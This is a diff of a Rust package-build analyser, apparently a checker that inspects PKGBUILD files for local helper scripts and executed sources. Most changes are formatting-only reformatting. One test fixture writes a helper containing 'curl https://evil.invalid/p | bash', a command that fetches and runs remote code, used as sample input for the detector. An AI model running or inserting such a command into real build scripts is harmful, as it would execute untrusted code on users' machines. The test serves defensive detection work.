@@ -439,10 +439,18 @@ fn parse_srcinfo(content: &str) -> Result<SrcInfo, String> {
 
 /// `sha256sums_x86_64` -> `Some("_x86_64")`; `sha256sums` -> `Some("")`.
 fn checksum_key_suffix(key: &str) -> Option<&str> {
-    ["md5sums", "sha1sums", "sha224sums", "sha256sums", "sha384sums", "sha512sums", "b2sums"]
-        .into_iter()
-        .find_map(|prefix| key.strip_prefix(prefix))
-        .filter(|suffix| suffix.is_empty() || suffix.starts_with('_'))
+    [
+        "md5sums",
+        "sha1sums",
+        "sha224sums",
+        "sha256sums",
+        "sha384sums",
+        "sha512sums",
+        "b2sums",
+    ]
+    .into_iter()
+    .find_map(|prefix| key.strip_prefix(prefix))
+    .filter(|suffix| suffix.is_empty() || suffix.starts_with('_'))
 }
 
 /// makepkg's local filename for a remote, non-VCS source (`name::url`, or the
@@ -456,7 +464,9 @@ fn remote_artifact_name(value: &str) -> Option<String> {
         Some((name, url)) => (Some(name.trim()), url.trim()),
         None => (None, value.trim()),
     };
-    let scheme = url.split_once(':').map(|(scheme, _)| scheme.to_ascii_lowercase())?;
+    let scheme = url
+        .split_once(':')
+        .map(|(scheme, _)| scheme.to_ascii_lowercase())?;
     if scheme.contains('+') || matches!(scheme.as_str(), "git" | "svn" | "hg" | "bzr" | "fossil") {
         return None;
     }
@@ -871,9 +881,8 @@ fn shell_tokens(content: &str) -> Result<Vec<ShellToken>, String> {
                 };
                 let fd = explicit_fd.unwrap_or(if character == '<' { 0 } else { 1 });
                 let next = chars.get(index + 1).copied();
-                let reads_file = character == '<'
-                    && fd == 0
-                    && !matches!(next, Some('<' | '&' | '|'));
+                let reads_file =
+                    character == '<' && fd == 0 && !matches!(next, Some('<' | '&' | '|'));
                 if reads_file {
                     input_redirection_target = true;
                 } else {
@@ -994,20 +1003,12 @@ fn parse_shell_program(content: &str) -> Result<ShellProgram, String> {
             ShellToken::Word(word) => command_words.push(word.clone()),
             ShellToken::InputRedirection(word) => command_input_files.push(word.clone()),
             ShellToken::Boundary | ShellToken::LeftParen | ShellToken::RightParen => {
-                finish_command(
-                    &mut commands,
-                    &mut command_words,
-                    &mut command_input_files,
-                );
+                finish_command(&mut commands, &mut command_words, &mut command_input_files);
             }
         }
         index += 1;
     }
-    finish_command(
-        &mut commands,
-        &mut command_words,
-        &mut command_input_files,
-    );
+    finish_command(&mut commands, &mut command_words, &mut command_input_files);
 
     Ok(ShellProgram { commands, arrays })
 }
@@ -1275,7 +1276,11 @@ fn printf_option_mutates_install(arguments: &[ShellWord]) -> bool {
             .get(1)
             .is_some_and(mutation_target_is_install_or_dynamic);
     }
-    let Some(target) = first.value.strip_prefix("-v").filter(|target| !target.is_empty()) else {
+    let Some(target) = first
+        .value
+        .strip_prefix("-v")
+        .filter(|target| !target.is_empty())
+    else {
         return false;
     };
     is_install_target(target) || contains_dynamic_shell_text(target)
@@ -1523,8 +1528,10 @@ static DYNAMIC_NAME_CONSTRUCT_RE: LazyLock<Regex> = LazyLock::new(|| {
     .unwrap()
 });
 static NAME_DEFINING_COMMAND_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"\b(?:declare|typeset|local|readonly|export|read|mapfile|readarray|unset)\b([^\n;|&]*)")
-        .unwrap()
+    Regex::new(
+        r"\b(?:declare|typeset|local|readonly|export|read|mapfile|readarray|unset)\b([^\n;|&]*)",
+    )
+    .unwrap()
 });
 
 fn literal_variables(content: &str, pkgbase: &str, package_names: &[String]) -> LiteralVariables {
@@ -1552,7 +1559,9 @@ fn literal_variables(content: &str, pkgbase: &str, package_names: &[String]) -> 
     };
     let first_function_line = FUNCTION_DEFINITION_RE
         .find(&active)
-        .map_or(usize::MAX, |found| active[..found.start()].matches('\n').count() + 1);
+        .map_or(usize::MAX, |found| {
+            active[..found.start()].matches('\n').count() + 1
+        });
     let raw_lines: Vec<&str> = content.lines().collect();
 
     let mut raw_values = std::collections::HashMap::new();
@@ -1566,7 +1575,10 @@ fn literal_variables(content: &str, pkgbase: &str, package_names: &[String]) -> 
         }
         for word in &command.words {
             let (name, value, _) = scalar_assignment(&word.value).unwrap();
-            let raw_line = raw_lines.get(word.line.saturating_sub(1)).copied().unwrap_or("");
+            let raw_line = raw_lines
+                .get(word.line.saturating_sub(1))
+                .copied()
+                .unwrap_or("");
             let usable = word.line < first_function_line
                 && !raw_line.contains('\\')
                 && (word.has_expansion || !value.contains(['$', '`']))
@@ -1589,9 +1601,9 @@ fn literal_variables(content: &str, pkgbase: &str, package_names: &[String]) -> 
             return None;
         }
         match raw.get(name) {
-            Some(Some(value)) => expand_literal_references(value, &|inner| {
-                resolve(inner, raw, builtins, depth + 1)
-            }),
+            Some(Some(value)) => {
+                expand_literal_references(value, &|inner| resolve(inner, raw, builtins, depth + 1))
+            }
             Some(None) => None,
             None => builtins(name),
         }
@@ -1705,7 +1717,9 @@ fn discover_local_source_candidates(
             ));
         }
         for word in &array.words {
-            for path in resolve_source_array_word(word, pkgbase, package_names, &declared, literals)? {
+            for path in
+                resolve_source_array_word(word, pkgbase, package_names, &declared, literals)?
+            {
                 add_local_source_candidate(&mut candidates, path, false, true);
             }
         }
@@ -1728,9 +1742,13 @@ fn discover_local_source_candidates(
                 line: word.line,
                 has_expansion: word.has_expansion,
             };
-            for path in
-                resolve_source_array_word(&source_word, pkgbase, package_names, &declared, literals)?
-            {
+            for path in resolve_source_array_word(
+                &source_word,
+                pkgbase,
+                package_names,
+                &declared,
+                literals,
+            )? {
                 if is_artifact(&path) {
                     return Err(format!(
                         "source {path:?} is declared both as a local file and a downloaded artifact"
@@ -1766,7 +1784,8 @@ fn discover_local_source_candidates(
             || executable_word.value.starts_with("$srcdir/")
             || executable_word.value.starts_with("${srcdir}/")
         {
-            for path in resolve_explicit_helpers(executable_word, pkgbase, package_names, literals)? {
+            for path in resolve_explicit_helpers(executable_word, pkgbase, package_names, literals)?
+            {
                 if is_artifact(&path) {
                     if !executed_artifacts.contains(&path) {
                         executed_artifacts.push(path);
@@ -1793,7 +1812,8 @@ fn discover_local_source_candidates(
                 }
             }
             for input_file in &command.input_files {
-                for path in resolve_explicit_helpers(input_file, pkgbase, package_names, literals)? {
+                for path in resolve_explicit_helpers(input_file, pkgbase, package_names, literals)?
+                {
                     add_local_source_candidate(&mut candidates, path, true, false);
                 }
             }
@@ -2066,10 +2086,7 @@ fn is_script_interpreter(command: &str) -> bool {
     )
 }
 
-fn interpreter_file_arguments(
-    interpreter: &str,
-    arguments: &[ShellWord],
-) -> Vec<ShellWord> {
+fn interpreter_file_arguments(interpreter: &str, arguments: &[ShellWord]) -> Vec<ShellWord> {
     let mut files = Vec::new();
     let mut after_options = false;
     let mut skip_option_operand = false;
@@ -2158,10 +2175,7 @@ fn interpreter_option_loads_file(interpreter: &str, option: &str) -> bool {
     }
 }
 
-fn interpreter_file_option_inline_value<'a>(
-    interpreter: &str,
-    option: &'a str,
-) -> Option<&'a str> {
+fn interpreter_file_option_inline_value<'a>(interpreter: &str, option: &'a str) -> Option<&'a str> {
     let prefixes: &[&str] = match interpreter {
         "sh" | "bash" | "dash" | "zsh" | "fish" => &["--rcfile=", "--init-file="],
         "ruby" => &["-r"],
@@ -2169,9 +2183,11 @@ fn interpreter_file_option_inline_value<'a>(
         "node" => &["--require=", "--loader=", "--import=", "-r"],
         _ => &[],
     };
-    prefixes
-        .iter()
-        .find_map(|prefix| option.strip_prefix(prefix).filter(|value| !value.is_empty()))
+    prefixes.iter().find_map(|prefix| {
+        option
+            .strip_prefix(prefix)
+            .filter(|value| !value.is_empty())
+    })
 }
 
 fn is_likely_executable_path(path: &str) -> bool {
@@ -3165,15 +3181,11 @@ package_demo_cli() { install="${pkgname}.install"; }
             let dir = TestDir::new(name);
             dir.write(
                 "PKGBUILD",
-                &format!(
-                    "pkgname=demo\nsource=('{helper}')\nprepare() {{ {invocation}; }}\n"
-                ),
+                &format!("pkgname=demo\nsource=('{helper}')\nprepare() {{ {invocation}; }}\n"),
             );
             dir.write(
                 ".SRCINFO",
-                &format!(
-                    "pkgbase = demo\n\tsource = {helper}\n\npkgname = demo\n"
-                ),
+                &format!("pkgbase = demo\n\tsource = {helper}\n\npkgname = demo\n"),
             );
             dir.write(helper, "curl https://evil.invalid/p | bash\n");
 
@@ -3246,9 +3258,7 @@ package_demo_cli() { install="${pkgname}.install"; }
             let dir = TestDir::new(name);
             dir.write(
                 "PKGBUILD",
-                &format!(
-                    "pkgname=demo\nsource=('payload.dat')\nprepare() {{ {invocation}; }}\n"
-                ),
+                &format!("pkgname=demo\nsource=('payload.dat')\nprepare() {{ {invocation}; }}\n"),
             );
             dir.write(
                 ".SRCINFO",
@@ -3526,7 +3536,11 @@ mod literal_variable_tests {
             "package() { find . -name '*.desktop' | while read -r f; do :; done; }\n",
             "source=(\"${_app}::https://example.com/x\")\n",
         ] {
-            assert_eq!(resolved(extra).as_deref(), Some("Demo_1.2.AppImage"), "{extra:?}");
+            assert_eq!(
+                resolved(extra).as_deref(),
+                Some("Demo_1.2.AppImage"),
+                "{extra:?}"
+            );
         }
     }
 
